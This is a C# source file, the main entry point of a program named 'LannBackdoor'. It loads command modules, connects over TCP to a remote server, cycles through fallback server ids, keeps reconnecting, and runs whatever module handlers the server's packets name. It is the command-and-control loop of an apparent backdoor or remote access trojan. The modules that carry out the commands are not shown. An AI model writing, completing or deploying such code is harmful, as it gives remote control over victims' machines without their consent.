using LannLogger;
using LannUtils;
using ModulesApi;
using Networking;
using Networking.Packets;
using Networking.Structures;
using Serilog.Core;
using SystemModule;
using Constants = LannConstants.Constants;

namespace LannBackdoor;

public static class LannBackdoor {
    private static readonly Logger    Logger     = LoggerFactory.CreateLogger("LannBackdoor");
    private static          TCPClient _tcpClient = null!;
    private static          int       _serverId;

    public static async Task Main() {
        Console.OutputEncoding = System.Text.Encoding.UTF8;

        if (Constants.Debug) Logger.Debug("Running {Mode} mode", "DEBUG");
        Logger.Information("Ohayou, ばか!");
        Logger.Information("Config:\n  - Debug: {Debug}\n  - Url: {URL}\n  - Port: {Port}",
                           Constants.Debug,
                           Utils.CreateUrl(_serverId),
                           Constants.Port);

        ModuleRegistry.LoadByAssembly(typeof(SystemModuleImpl).Assembly);
        await Connect();

        while (true) await Task.Delay(1000);
    }

    private static async Task Connect() {
        _tcpClient = new TCPClient(Utils.CreateUrl(_serverId), Constants.Port);

        _tcpClient.OnConnect += async (_, _) => {
            Logger.Information("Connected!");
            await _tcpClient.StartHandlingPackets();
            await _tcpClient.SendPacket(new ClientPacket { Type = PacketType.Ready });
        };

        _tcpClient.OnCommand += async (_, data) => {
            Packet packet = data.Packet;
            Logger.Debug("Packet received: {Module}/{Handler}: {@Data}",
                         packet.ModuleId,
                         packet.HandlerId,
                         packet.GetData<object>());

            ModuleInfo? module = ModuleRegistry.Get(packet.ModuleId);
            if (module == null) {
                Logger.Debug("Unknown module: {Id}", packet.ModuleId);
                return;
            }

            if (!_tcpClient.IsVerified && !module.Name.Equals("system")) {
                Logger.Fatal("Socket is not verified, but packet received!");
                _tcpClient.Dispose();
                return;
            }

            HandlerInfo? handler = module.GetHandler(packet.HandlerId);
            if (handler == null) {
                Logger.Debug("Unknown handler: {Module}/{Id}",
                             packet.ModuleId,
                             packet.HandlerId);
                return;
            }

            try {
                Type type = handler.GetDataType();
                await handler.Execute(_tcpClient, packet.GetData<object>(type));
            } catch (Exception e) {
                Logger.Error("Handler {Module}/{Handler} invocation failed: {Error}",
                             packet.ModuleId,
                             packet.HandlerId,
                             e.Message);
            }
        };

        _tcpClient.OnClose += async (_, _) => {
            Logger.Information("Socket closed, reconnecting in 5000 ms");
            await Task.Delay(5000);
            await Connect();
        };

        try {
            await _tcpClient.Connect();
        } catch {
            Logger.Information("Connection failed, connecting to server {Id} in 5000 ms", ++_serverId);
            await Task.Delay(5000);
            await Connect();
        }
    }
}